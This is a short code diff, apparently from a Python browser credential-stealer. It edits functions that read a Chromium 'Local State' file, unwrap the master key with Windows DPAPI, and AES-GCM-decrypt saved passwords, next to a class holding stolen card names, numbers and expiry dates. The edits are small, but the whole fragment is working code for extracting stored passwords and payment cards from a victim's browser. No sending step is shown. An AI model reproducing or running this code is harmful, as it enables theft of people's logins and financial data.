@@ -96,7 +96,7 @@ class Types:
         def __str__(self):
             return f"Name On Card: {self.name}\nCard Number: {self.number}\nExpires On: {self.exp_mth} / {self.exp_year}\nAdded On: {datetime.fromtimestamp(self.added_date)}"
 
-def get_master_key(path: str):
+def get_master_key(path: str) -> bytes:
     if not exists(path):
         return None
     local_state_path = join(path, "Local State")
@@ -109,17 +109,17 @@ def get_master_key(path: str):
     local_state = json.loads(c)
     master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
     try:
-        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        master_key = CryptUnprotectData(master_key, Flags=0)[1]
         return master_key
     except Exception as e: Log(f"{path} Local State ---> {e}")
         
 
-def decrypt_password(buff: bytes, master_key: bytes):
+def decrypt_password(buff: bytes, master_key: bytes) -> str:
     iv = buff[3:15]
     payload = buff[15:]
     cipher = AES.new(master_key, AES.MODE_GCM, iv)
     decrypted_pass = cipher.decrypt(payload)
-    decrypted_pass = decrypted_pass[:-16].decode(errors="replace")  
+    decrypted_pass = decrypted_pass[:-16].decode("utf-8")  
     return decrypted_pass
 
 
